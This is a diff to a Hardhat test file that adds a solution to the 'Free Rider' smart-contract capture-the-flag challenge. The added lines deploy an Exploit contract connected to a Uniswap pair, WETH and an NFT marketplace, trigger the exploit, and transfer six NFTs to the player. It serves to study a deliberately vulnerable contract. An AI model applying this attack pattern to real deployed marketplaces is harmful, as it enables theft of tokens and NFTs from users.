@@ -106,6 +106,18 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const exploit = await (await ethers.getContractFactory('contracts/free-rider/Exploit.sol:Exploit'))
+                                    .deploy(uniswapPair.address, token.address,
+                                    weth.address, uniswapRouter.address,
+                                    nft.address, marketplace.address,
+                                    devsContract.address,
+                                    player.address,
+                                    { value: PLAYER_INITIAL_ETH_BALANCE });
+        await exploit.connect(player).exploit(NFT_PRICE);
+
+        for (let id = 0; id < 6; id++) {
+            await exploit.connect(player).transferNft(id);
+        }
     });
 
     after(async function () {
